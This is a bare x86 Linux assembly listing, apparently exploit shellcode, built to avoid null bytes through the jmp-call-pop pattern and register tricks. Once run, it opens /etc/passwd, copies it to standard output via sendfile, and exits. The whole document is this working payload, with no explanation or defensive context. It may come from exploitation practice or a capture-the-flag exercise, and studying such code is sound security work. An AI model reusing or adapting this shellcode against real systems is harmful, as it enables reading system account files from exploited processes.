        .intel_syntax noprefix
        .globl _start
_start:
        jmp caller
callee:
        pop ebx
        xor ecx, ecx
        mov cl, [ebx]
        inc ebx
        mov [ebx+ecx], ch
main:
        xor edx, edx
        xor ecx, ecx
        lea eax, [edx+5]
        int 0x80                # open
        xchg ecx, eax
        lea ebx, [edx+1]
        xor esi, esi
        not si
        lea eax, [edx+68]
        not al
        int 0x80                # sendfile
        xor ebx, ebx
        lea eax, [edx+1]
        int 0x80                # exit
caller:
        call callee
arg:
        .byte 11
        .ascii "/etc/passwd"
